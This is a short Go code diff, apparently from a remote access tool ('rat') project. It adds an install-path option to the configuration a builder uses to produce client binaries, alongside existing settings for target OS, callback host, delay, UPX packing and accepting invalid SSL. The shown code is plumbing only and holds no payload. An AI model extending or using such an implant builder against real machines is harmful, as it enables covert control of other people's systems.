@@ -11,17 +11,19 @@ import (
 	"os"
 	"rat/common"
 	"rat/common/crypto"
+	"rat/common/installpath"
 )
 
 // Config is received from the websocket
 type Config struct {
-	TargetOS   string `json:"os"`
-	TargetArch string `json:"arch"`
-	Host       string `json:"host"`
-	Delay      int    `json:"delay"`
-	UPX        bool   `json:"upx"`
-	Name       string `json:"name"`
-	InvalidSSL bool   `json:"invalid_ssl"`
+	TargetOS    string `json:"os"`
+	TargetArch  string `json:"arch"`
+	Host        string `json:"host"`
+	Delay       int    `json:"delay"`
+	UPX         bool   `json:"upx"`
+	Name        string `json:"name"`
+	InstallPath int    `json:"install_path"`
+	InvalidSSL  bool   `json:"invalid_ssl"`
 }
 
 type file struct {
@@ -54,7 +56,7 @@ func Build(c *Config) (string, string, error) {
 		Host:       c.Host,
 		Delay:      c.Delay,
 		Name:       c.Name,
-		Install:    0,
+		Install:    installpath.Path(c.InstallPath),
 		InvalidSSL: c.InvalidSSL,
 	}
 
